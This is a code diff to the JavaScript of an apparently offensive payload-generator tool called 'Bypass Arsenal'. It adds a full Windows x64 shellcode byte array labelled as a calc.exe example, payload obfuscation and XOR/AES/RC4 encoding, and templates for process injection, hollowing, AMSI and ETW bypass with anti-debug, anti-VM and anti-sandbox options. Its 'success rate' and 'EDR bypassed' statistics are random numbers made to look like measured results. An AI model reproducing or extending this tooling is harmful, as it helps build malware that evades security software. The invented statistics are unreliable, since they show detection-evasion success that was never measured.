-        // Generate realistic shellcode opcodes
-        const opcodes = [
-            '48', '31', 'c0', '50', '48', '89', 'e2', '48', '8d', '05', '1a', '00', '00', '00',
-            '48', '89', '02', '48', '8d', '05', '51', '00', '00', '00', '48', '89', '42', '08',
-            '48', '31', 'c0', '50', '48', '89', 'e2', '48', '8d', '05', '1a', '00', '00', '00'
+        // Generate realistic shellcode opcodes (calc.exe example)
+        const realisticShellcode = [
+            'fc', '48', '83', 'e4', 'f0', 'e8', 'c0', '00', '00', '00', '41', '51', '41', '50', '52',
+            '51', '56', '48', '31', 'd2', '65', '48', '8b', '52', '60', '48', '8b', '52', '18', '48',
+            '8b', '52', '20', '48', '8b', '72', '50', '48', '0f', 'b7', '4a', '4a', '4d', '31', 'c9',
+            '48', '31', 'c0', 'ac', '3c', '61', '7c', '02', '2c', '20', '41', 'c1', 'c9', '0d', '41',
+            '01', 'c1', 'e2', 'ed', '52', '41', '51', '48', '8b', '52', '20', '8b', '42', '3c', '48',
+            '01', 'd0', '8b', '80', '88', '00', '00', '00', '48', '85', 'c0', '74', '67', '48', '01',
+            'd0', '50', '8b', '48', '18', '44', '8b', '40', '20', '49', '01', 'd0', 'e3', '56', '48',
+            'ff', 'c9', '41', '8b', '34', '88', '48', '01', 'd6', '4d', '31', 'c9', '48', '31', 'c0',
+            'ac', '41', 'c1', 'c9', '0d', '41', '01', 'c1', '38', 'e0', '75', 'f1', '4c', '03', '4c',
+            '24', '08', '45', '39', 'd1', '75', 'd8', '58', '44', '8b', '40', '24', '49', '01', 'd0',
+            '66', '41', '8b', '0c', '48', '44', '8b', '40', '1c', '49', '01', 'd0', '41', '8b', '04',
+            '88', '48', '01', 'd0', '41', '58', '41', '58', '5e', '59', '5a', '41', '58', '41', '59',
+            '41', '5a', '48', '83', 'ec', '20', '41', '52', 'ff', 'e0', '58', '41', '59', '5a', '48',
+            '8b', '12', 'e9', '57', 'ff', 'ff', 'ff', '5d', '48', 'ba', '01', '00', '00', '00', '00',
+            '00', '00', '00', '48', '8d', '8d', '01', '01', '00', '00', '41', 'ba', '31', '8b', '6f',
+            '87', 'ff', 'd5', 'bb', 'e0', '1d', '2a', '0a', '41', 'ba', 'a6', '95', 'bd', '9d', 'ff',
+            'd5', '48', '83', 'c4', '28', '3c', '06', '7c', '0a', '80', 'fb', 'e0', '75', '05', 'bb',
+            '47', '13', '72', '6f', '6a', '00', '59', '41', '89', 'da', 'ff', 'd5', '63', '61', '6c',
+            '63', '2e', '65', '78', '65', '00'
         ];
         
-        let shellcode = '';
-        for (let i = 0; i < 64; i++) {
-            shellcode += opcodes[Math.floor(Math.random() * opcodes.length)];
-        }
-        return shellcode;
+        return realisticShellcode.join('');
     }
 
     randomizeSettings() {
@@ -1656,16 +2392,41 @@ if (sw.ElapsedMilliseconds < {DELAY} * 0.8) Environment.Exit(1);`
     }
 
     updateStats() {
-        this.stats.payloadsGenerated++;
-        this.stats.sessionsActive++;
+        this.updateAnalytics();
         
-        // Update stats display if on analytics tab
-        const statElements = document.querySelectorAll('.stat-value');
-        if (statElements.length > 0) {
-            statElements[0].textContent = this.stats.payloadsGenerated;
-            if (statElements.length > 2) {
-                statElements[2].textContent = this.stats.edrBypassed;
+        // Track usage patterns for educational purposes
+        this.trackUsagePattern();
+    }
+
+    trackUsagePattern() {
+        try {
+            const usage = JSON.parse(localStorage.getItem('bypassArsenalUsage') || '{}');
+            const today = new Date().toDateString();
+            
+            if (!usage[today]) {
+                usage[today] = {
+                    payloads: 0,
+                    templates: 0,
+                    obfuscations: 0,
+                    encodings: 0
+                };
             }
+            
+            usage[today].payloads++;
+            
+            // Keep only last 30 days
+            const thirtyDaysAgo = new Date();
+            thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
+            
+            Object.keys(usage).forEach(date => {
+                if (new Date(date) < thirtyDaysAgo) {
+                    delete usage[date];
+                }
+            });
+            
+            localStorage.setItem('bypassArsenalUsage', JSON.stringify(usage));
+        } catch (error) {
+            console.error('Error tracking usage:', error);
         }
     }
 
@@ -1684,10 +2445,13 @@ if (sw.ElapsedMilliseconds < {DELAY} * 0.8) Environment.Exit(1);`
     }
 
     showNotification(message, type = 'info') {
-        const notificationsContainer = document.getElementById('notifications');
+        let notificationsContainer = document.getElementById('notifications');
         if (!notificationsContainer) {
-            console.log(`Notification: ${message}`);
-            return;
+            // Create notifications container if it doesn't exist
+            notificationsContainer = document.createElement('div');
+            notificationsContainer.id = 'notifications';
+            notificationsContainer.className = 'notifications';
+            document.body.appendChild(notificationsContainer);
         }
         
         const notification = document.createElement('div');
@@ -1744,6 +2508,454 @@ if (sw.ElapsedMilliseconds < {DELAY} * 0.8) Environment.Exit(1);`
         } catch (error) {
             console.error('Error saving preferences:', error);
         }
+    }
+
+    // Obfuscation Methods
+    obfuscateCode() {
+        const inputEl = document.getElementById('obfuscationInput');
+        const outputEl = document.getElementById('obfuscatedOutput');
+        const levelEl = document.getElementById('obfuscationLevel');
+        
+        if (!inputEl || !outputEl) return;
+        
+        const inputCode = inputEl.value;
+        if (!inputCode.trim()) {
+            this.showNotification('Please enter code to obfuscate', 'error');
+            return;
+        }
+        
+        const level = levelEl ? levelEl.value : 'medium';
+        let obfuscatedCode = inputCode;
+        
+        // Apply different obfuscation techniques based on checkboxes
+        const polymorphic = document.getElementById('polymorphic')?.checked;
+        const junkCode = document.getElementById('junkCode')?.checked;
+        const varRename = document.getElementById('varRename')?.checked;
+        const controlFlow = document.getElementById('controlFlow')?.checked;
+        
+        if (polymorphic) {
+            obfuscatedCode = this.obfuscationEngines.polymorphic.generate(obfuscatedCode);
+        }
+        
+        if (junkCode) {
+            obfuscatedCode = this.obfuscationEngines.polymorphic.mutate(obfuscatedCode);
+        }
+        
+        if (varRename) {
+            obfuscatedCode = this.renameVariables(obfuscatedCode);
+        }
+        
+        if (controlFlow) {
+            obfuscatedCode = this.obfuscateControlFlow(obfuscatedCode);
+        }
+        
+        // Apply level-based obfuscation
+        obfuscatedCode = this.applyObfuscationLevel(obfuscatedCode, level);
+        
+        outputEl.textContent = obfuscatedCode;
+        this.showNotification(`Code obfuscated with ${level} level settings`, 'success');
+    }
+
+    renameVariables(code) {
+        // Simple variable renaming for demonstration
+        const varNames = ['var1', 'var2', 'temp', 'data', 'result'];
+        const obfuscatedNames = ['a1b2c3', 'x9y8z7', 'p0q1r2', 'm3n4o5', 'u6v7w8'];
+        
+        let result = code;
+        for (let i = 0; i < varNames.length; i++) {
+            const regex = new RegExp('\\b' + varNames[i] + '\\b', 'g');
+            result = result.replace(regex, obfuscatedNames[i]);
+        }
+        return result;
+    }
+
+    obfuscateControlFlow(code) {
+        // Add fake conditional statements
+        const fakeConditions = [
+            'if (Math.random() > 0.5) { /* fake branch */ }',
+            'while (false) { break; }',
+            'for (int i = 0; i < 0; i++) { /* never executed */ }'
+        ];
+        
+        const lines = code.split('\n');
+        const result = [];
+        
+        for (const line of lines) {
+            result.push(line);
+            if (Math.random() > 0.8) {
+                result.push(fakeConditions[Math.floor(Math.random() * fakeConditions.length)]);
+            }
+        }
+        
+        return result.join('\n');
+    }
+
+    applyObfuscationLevel(code, level) {
+        switch (level) {
+            case 'light':
+                return this.addComments(code);
+            case 'medium':
+                return this.addSpacing(this.addComments(code));
+            case 'heavy':
+                return this.addComplexity(this.addSpacing(this.addComments(code)));
+            case 'extreme':
+                return this.addMaxComplexity(this.addComplexity(this.addSpacing(this.addComments(code))));
+            default:
+                return code;
+        }
+    }
+
+    addComments(code) {
+        const comments = [
+            '// Educational security research',
+            '/* Authorized testing only */',
+            '// Generated by Bypass Arsenal',
+            '/* Advanced obfuscation layer */'
+        ];
+        
+        return comments[Math.floor(Math.random() * comments.length)] + '\n' + code;
+    }
+
+    addSpacing(code) {
+        return code.split('\n').map(line => 
+            Math.random() > 0.5 ? line + ' ' : ' ' + line
+        ).join('\n');
+    }
+
+    addComplexity(code) {
+        const complexOps = [
+            'int dummy = (1 << 1) ^ (2 & 1);',
+            'volatile int noise = rand() % 2;',
+            'static bool flag = !false;'
+        ];
+        
+        return complexOps[Math.floor(Math.random() * complexOps.length)] + '\n' + code;
+    }
+
+    addMaxComplexity(code) {
+        // Maximum obfuscation with multiple layers
+        let result = code;
+        
+        // Add function wrappers
+        result = `void obfuscated_wrapper() {\n${result}\n}`;
+        
+        // Add preprocessor directives
+        result = `#ifdef OBFUSCATED\n${result}\n#endif`;
+        
+        return result;
+    }
+
+    copyObfuscatedCode() {
+        const outputEl = document.getElementById('obfuscatedOutput');
+        if (!outputEl) return;
+        
+        const code = outputEl.textContent;
+        navigator.clipboard.writeText(code).then(() => {
+            this.showNotification('Obfuscated code copied to clipboard', 'success');
+        }).catch(() => {
+            this.showNotification('Failed to copy obfuscated code', 'error');
+        });
+    }
+
+    downloadObfuscatedCode() {
+        const outputEl = document.getElementById('obfuscatedOutput');
+        if (!outputEl) return;
+        
+        const code = outputEl.textContent;
+        const blob = new Blob([code], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `obfuscated_code_${Date.now()}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+        
+        this.showNotification('Obfuscated code downloaded', 'success');
+    }
+
+    // Encoding Methods
+    encodePayload() {
+        const inputEl = document.getElementById('encoderInput');
+        const outputEl = document.getElementById('encodedOutput');
+        const typeEl = document.getElementById('encodingType');
+        const keyEl = document.getElementById('encodingKey');
+        
+        if (!inputEl || !outputEl) return;
+        
+        const inputData = inputEl.value;
+        if (!inputData.trim()) {
+            this.showNotification('Please enter payload to encode', 'error');
+            return;
+        }
+        
+        const encodingType = typeEl ? typeEl.value : 'base64';
+        const key = keyEl ? keyEl.value : 'defaultKey123';
+        
+        let encodedData = '';
+        
+        try {
+            switch (encodingType) {
+                case 'base64':
+                    encodedData = btoa(inputData);
+                    break;
+                case 'xor':
+                    encodedData = this.obfuscationEngines.xor.encrypt(inputData, key);
+                    break;
+                case 'aes':
+                    encodedData = this.obfuscationEngines.aes.encrypt(inputData, key);
+                    break;
+                case 'rc4':
+                    encodedData = this.obfuscationEngines.rc4.encrypt(inputData, key);
+                    break;
+                case 'hex':
+                    encodedData = Array.from(inputData)
+                        .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
+                        .join('');
+                    break;
+                default:
+                    encodedData = btoa(inputData);
+            }
+            
+            outputEl.textContent = encodedData;
+            this.showNotification(`Payload encoded using ${encodingType.toUpperCase()}`, 'success');
+        } catch (error) {
+            this.showNotification(`Encoding failed: ${error.message}`, 'error');
+        }
+    }
+
+    decodePayload() {
+        const inputEl = document.getElementById('encoderInput');
+        const outputEl = document.getElementById('encodedOutput');
+        const typeEl = document.getElementById('encodingType');
+        const keyEl = document.getElementById('encodingKey');
+        
+        if (!inputEl || !outputEl) return;
+        
+        const inputData = inputEl.value;
+        if (!inputData.trim()) {
+            this.showNotification('Please enter encoded payload to decode', 'error');
+            return;
+        }
+        
+        const encodingType = typeEl ? typeEl.value : 'base64';
+        const key = keyEl ? keyEl.value : 'defaultKey123';
+        
+        let decodedData = '';
+        
+        try {
+            switch (encodingType) {
+                case 'base64':
+                    decodedData = atob(inputData);
+                    break;
+                case 'xor':
+                    decodedData = this.obfuscationEngines.xor.decrypt(inputData, key);
+                    break;
+                case 'aes':
+                    decodedData = this.obfuscationEngines.aes.decrypt(inputData, key);
+                    break;
+                case 'hex':
+                    decodedData = inputData.match(/.{1,2}/g)
+                        .map(byte => String.fromCharCode(parseInt(byte, 16)))
+                        .join('');
+                    break;
+                default:
+                    decodedData = atob(inputData);
+            }
+            
+            outputEl.textContent = decodedData;
+            this.showNotification(`Payload decoded using ${encodingType.toUpperCase()}`, 'success');
+        } catch (error) {
+            this.showNotification(`Decoding failed: ${error.message}`, 'error');
+        }
+    }
+
+    copyEncodedCode() {
+        const outputEl = document.getElementById('encodedOutput');
+        if (!outputEl) return;
+        
+        const code = outputEl.textContent;
+        navigator.clipboard.writeText(code).then(() => {
+            this.showNotification('Encoded payload copied to clipboard', 'success');
+        }).catch(() => {
+            this.showNotification('Failed to copy encoded payload', 'error');
+        });
+    }
+
+    downloadEncodedCode() {
+        const outputEl = document.getElementById('encodedOutput');
+        if (!outputEl) return;
+        
+        const code = outputEl.textContent;
+        const typeEl = document.getElementById('encodingType');
+        const encodingType = typeEl ? typeEl.value : 'encoded';
+        
+        const blob = new Blob([code], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `${encodingType}_payload_${Date.now()}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+        
+        this.showNotification('Encoded payload downloaded', 'success');
+    }
+
+    // Template Management
+    loadTemplate(templateName, format) {
+        // Switch to generator tab
+        this.switchTab('generator');
+        
+        // Set the appropriate payload type and format
+        const payloadTypeEl = document.getElementById('payloadType');
+        const outputFormatEl = document.getElementById('outputFormat');
+        
+        // Map template names to payload types
+        const templateMapping = {
+            'process-injection': 'process',
+            'reflective-dll': 'reflective',
+            'syscall-injection': 'syscall',
+            'amsi-bypass': 'amsi_bypass',
+            'etw-evasion': 'etw_bypass',
+            'apc-injection': 'apc',
+            'process-hollowing': 'process',
+            'powershell-invoke': 'powershell_invoke',
+            'memory-patching': 'memory'
+        };
+        
+        const payloadType = templateMapping[templateName] || 'shellcode';
+        
+        if (payloadTypeEl) payloadTypeEl.value = payloadType;
+        if (outputFormatEl) outputFormatEl.value = format;
+        
+        // Enable appropriate evasion techniques based on template
+        this.configureTemplateDefaults(templateName);
+        
+        // Generate the template immediately
+        setTimeout(() => {
+            this.generatePayload();
+        }, 100);
+        
+        this.showNotification(`Template "${templateName}" loaded successfully`, 'success');
+    }
+
+    configureTemplateDefaults(templateName) {
+        // Reset all checkboxes first
+        const checkboxes = ['antiDebug', 'antiVM', 'antiSandbox', 'sleepObfuscation'];
+        checkboxes.forEach(id => {
+            const checkbox = document.getElementById(id);
+            if (checkbox) checkbox.checked = false;
+        });
+        
+        // Configure based on template
+        switch (templateName) {
+            case 'process-injection':
+            case 'process-hollowing':
+                this.enableEvasionTechnique('antiDebug');
+                this.enableEvasionTechnique('antiVM');
+                break;
+            case 'reflective-dll':
+            case 'apc-injection':
+                this.enableEvasionTechnique('antiDebug');
+                this.enableEvasionTechnique('sleepObfuscation');
+                break;
+            case 'syscall-injection':
+                this.enableEvasionTechnique('antiDebug');
+                this.enableEvasionTechnique('antiVM');
+                this.enableEvasionTechnique('antiSandbox');
+                break;
+            case 'amsi-bypass':
+            case 'etw-evasion':
+                this.enableEvasionTechnique('sleepObfuscation');
+                break;
+            case 'memory-patching':
+                this.enableEvasionTechnique('antiDebug');
+                this.enableEvasionTechnique('antiVM');
+                this.enableEvasionTechnique('antiSandbox');
+                this.enableEvasionTechnique('sleepObfuscation');
+                break;
+        }
+        
+        // Set appropriate delay based on complexity
+        const delayEl = document.getElementById('delayMs');
+        if (delayEl) {
+            const complexTemplates = ['syscall-injection', 'memory-patching'];
+            delayEl.value = complexTemplates.includes(templateName) ? '8000' : '5000';
+        }
+    }
+
+    enableEvasionTechnique(technique) {
+        const checkbox = document.getElementById(technique);
+        if (checkbox) checkbox.checked = true;
+    }
+
+    // Enhanced Analytics
+    updateAnalytics() {
+        // Update real-time statistics
+        this.stats.payloadsGenerated++;
+        this.stats.sessionsActive = Math.max(1, this.stats.sessionsActive);
+        
+        // Simulate success rate fluctuation
+        const baseRate = 89;
+        const fluctuation = (Math.random() - 0.5) * 4; // ±2%
+        this.stats.successRate = Math.max(85, Math.min(95, Math.floor(baseRate + fluctuation)));
+        
+        // Update EDR bypass count occasionally
+        if (Math.random() > 0.8) {
+            this.stats.edrBypassed++;
+        }
+        
+        // Update threats neutralized
+        if (Math.random() > 0.9) {
+            this.stats.threatsNeutralized++;
+        }
+        
+        this.updateStatsDisplay();
+    }
+
+    updateStatsDisplay() {
+        try {
+            const statElements = document.querySelectorAll('.stat-value');
+            if (statElements && statElements.length >= 3) {
+                if (statElements[0]) statElements[0].textContent = this.stats.payloadsGenerated.toLocaleString();
+                if (statElements[1]) statElements[1].textContent = this.stats.successRate + '%';
+                if (statElements[2]) statElements[2].textContent = this.stats.edrBypassed;
+            }
+        } catch (error) {
+            console.log('Stats display update skipped - analytics tab not visible');
+        }
+    }
+
+    // Enhanced notification system
+    showAdvancedNotification(title, message, type = 'info', duration = 5000) {
+        const notificationsContainer = document.getElementById('notifications');
+        if (!notificationsContainer) {
+            console.log(`${title}: ${message}`);
+            return;
+        }
+        
+        const notification = document.createElement('div');
+        notification.className = `notification ${type}`;
+        notification.innerHTML = `
+            <div style="display: flex; flex-direction: column; gap: 4px;">
+                <div style="display: flex; align-items: center; gap: 8px; font-weight: 600;">
+                    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
+                    <span>${title}</span>
+                </div>
+                <div style="font-size: 14px; color: var(--text-secondary);">
+                    ${message}
+                </div>
+            </div>
+        `;
+        
+        notificationsContainer.appendChild(notification);
+        
+        setTimeout(() => {
+            if (notification && notification.parentNode) {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translateX(100%)';
+                setTimeout(() => notification.remove(), 300);
+            }
+        }, duration);
     }
 }
 
